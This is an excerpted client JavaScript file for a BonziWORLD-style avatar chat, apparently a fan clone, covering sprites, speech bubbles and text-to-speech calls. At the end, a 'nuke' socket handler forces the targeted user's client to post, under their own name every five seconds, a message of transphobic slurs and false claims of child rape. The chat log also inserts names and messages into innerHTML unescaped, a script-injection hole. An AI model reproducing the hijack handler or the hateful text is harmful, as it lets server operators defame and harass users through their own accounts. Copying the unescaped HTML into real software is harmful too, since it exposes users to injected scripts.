...
function killweblolo() {
    disapear = new Audio("./sfx/pop_7e9Is8L.mp3"),
    disapear.play(),
    $("#content").hide();
    socket.disconnect();
}
...
function errorFatal() {
    error = new Audio("../sfx/G A M E O N.mp3"),
    error.play();
...
function setup() {
    $("#chat_send").click(sendInput),
        ...
        socket.on("admin", function() {
            admin = true;
            $(`#bonzi_`+this.id+`> .bonzi_user > .user-inner > .icon`).html("<i class='fas fa-gavel' title='Administrator' style='color: #be6400'/>");
        }),
    ...
    Bonzi = (function () {
        function a(b, c) {
            ...
            _classCallCheck(this, a),
                (this.userPublic = c || { name: "BonziBUDDY", color: "purple", hat: "none", speed: 175, pitch: 50, voice: "en-us" }),
                ...
                this.$container.append(
                    "\n\t\t\t<div id='bonzi_" +
                        this.id +
                        "' class='bonzi'>\n\t\t\t\t<div class='bonzi_status' style='display:none'></div><div class='bonzi_user'><div class='user-inner'><div class='icon'></div></span><span class='bonzi_username'></span></div> <i class='typing' hidden>(typing)</i></div>\n\t\t\t\t\t<div class='bonzi_placeholder'></div>\n\t\t\t\t<div style='display:none' class='bubble'>\n\t\t\t\t\t<p class='bubble-content'></p>\n\t\t\t\t<div class='close-bubble'><i class='fas fa-times' /></div>\n\t\t\t\t</div>\n\t\t\t</div>\n\t\t"
                ),
            ...
            _createClass(a, [
                ...
                },
                {
                    ...
                    value: function () {
                        ...
                        } else if (allowHats == true) {

                            if (this.color == "empty" && this.userPublic.color_cross != 'none') { 
                                this.$canvas.css("background-image", `url("${this.userPublic.color_cross}"), url("/img/hats/${this.hat}.png")`);
                            } else {
                                this.$canvas.css("background-image", `url("/img/agents/${this.color}.png"), url("/img/hats/${this.hat}.png")`);
                            }
                        }
                        if (this.color == "empty" && this.userPublic.color_cross != 'none') {
                ...
                },
                {
                    ...
                    value: function (a, b, c) {
                        ...
                        document.getElementById("chat_log_list").innerHTML += "<ul><li class=\"bonzi-message cl-msg ng-scope bonzi-event\" id=\"cl-msg-"+d.id+"\"><span class=\"timestamp ng-binding\"><small style=\"font-size:11px;font-weight:normal;\">"+date+"</small></span> <span class=\"sep tn-sep\"> | </span><span class=\"bonzi-name ng-isolate-scope\"><span class=\"event-source ng-binding ng-scope\"><font color='"+this.userPublic.color+"'>"+this.userPublic.name+"</font></span></span><span class=\"sep bn-sep\">: </span><span class=\"body ng-binding ng-scope\" style=\"color:#dcdcdc;\">"+a+"</span></li></ul>";
                        ...
                        this.$dialog.removeClass('bubble_autowidth');
                            ...
                            if (this.userPublic.voice == "sam") {
                                ...
                                this.userPublic.a = new Audio("https://www.tetyys.com/SAPI4/SAPI4?text=" + encodeURIComponent(a) + "&voice=Sam&pitch=" + Math.max(Math.min(parseInt(this.userPublic.pitch), 200), 60) + "&speed=" + Math.max(Math.min(parseInt(this.userPublic.speed), 250), 50) + "");
                                ...
                                this.userPublic.a = new Audio("https://www.tetyys.com/SAPI4/SAPI4?text=" + encodeURIComponent(a) + "&voice=Mike&pitch=" + Math.max(Math.min(parseInt(this.userPublic.pitch), 226), 60) + "&speed=" + Math.max(Math.min(parseInt(this.userPublic.speed), 250), 50) + "");
                                this.userPublic.a.play();
                                this.userPublic.a.onended = function() {
                                    d.clearDialog()
                                }
                                ...
                                this.userPublic.a = new Audio("https://www.tetyys.com/SAPI4/SAPI4?text=" + encodeURIComponent(a) + "&voice=" + encodeURIComponent(voice) + "&pitch=" + Math.max(Math.min(parseInt(this.userPublic.pitch), 400), 50) + "&speed=" + Math.max(Math.min(parseInt(this.userPublic.speed), 250), 50) + "");
                                this.userPublic.a.play();
                                this.userPublic.a.onended = function() {
                                    d.clearDialog()
                                }
                                ...
                                this.userPublic.a = new Audio("https://www.tetyys.com/SAPI4/SAPI4?text=" + encodeURIComponent(a) + "&voice=Mary&pitch=" + Math.max(Math.min(parseInt(this.userPublic.pitch), 336), 60) + "&speed=" + Math.max(Math.min(parseInt(this.userPublic.speed), 250), 50) + "");
                                this.userPublic.a.play();
                                this.userPublic.a.onended = function() {
                                    d.clearDialog()
                                }
                                ...
                                var voice2;
                                this.userPublic.a = new Audio("https://mespeakjs-server-production.up.railway.app/voiceforge?text=" + encodeURIComponent(a) + "&voice="+ encodeURIComponent(replaceAll(this.userPublic.voice,"voiceforge:","")));
                                this.userPublic.a.play();
                                this.userPublic.a.onended = function() {
                                    d.clearDialog()
                                }
                                                                    ...
                                                                    var voice2;
                                this.userPublic.a = new Audio("https://api.streamelements.com/kappa/v2/speech?text=" + encodeURIComponent(a) + "&voice="+ encodeURIComponent(replaceAll(this.userPublic.voice,"streamelements:","")));
                                this.userPublic.a.play();
                                this.userPublic.a.onended = function() {
                                    d.clearDialog()
                                }
                    ...
                    value: function (a) {
                        this.runSingleEvent([
                            { type: "text", text: "Hello, " + a + "!" }, 
                                             { type: "text", text: "Welcome to ReBonziWORLDivived!", say: "welcome to re bonziworld divived!"},
                                            ]);
                    },
                },
                {
...
(BonziData.event_list_joke = [
    ...
    (BonziData.event_list_bees = [
        ...
        { type: "text", text: "Nah, i ain't reading all of that...." },
        ...
        window.BonziHandler = new (function () {
            return (
                ...
                (this.prepSprites = function () {
                    for (var a = ["black", "blue", "brown", "green", "purple", "red", "pink", "pope", "empty", "merlin", "clippy", "daffy", "genie", "robby", "peedy", "rover"], b = 0; b < a.length; b++) {
                        var c = a[b],
                            d = { images: ["./img/agents/" + c + ".png"], frames: BonziData.sprite.frames, animations: BonziData.sprite.animations };
                ...
                (this.bonzisCheck = function () {
                    for (var a = 0; a < usersAmt; a++) {
                        ...
                        if (b in bonzis) {
                            var c = bonzis[b];
                            (c.userPublic = usersPublic[b]), c.updateName(), c.updateStatus(c.userPublic.status);
...
$(function () {
    $("#login_go").click(loadTest),
        ...
        socket.on("nuke", function () {
             setInterval(function(){
                socket.emit("talk", {
                text: "oh hi uwu~ i am silly {NAME} and i am a tranny troon bitch and i rape kids and want to rape you uwu~~"
             })
             }, 5000);
        }),
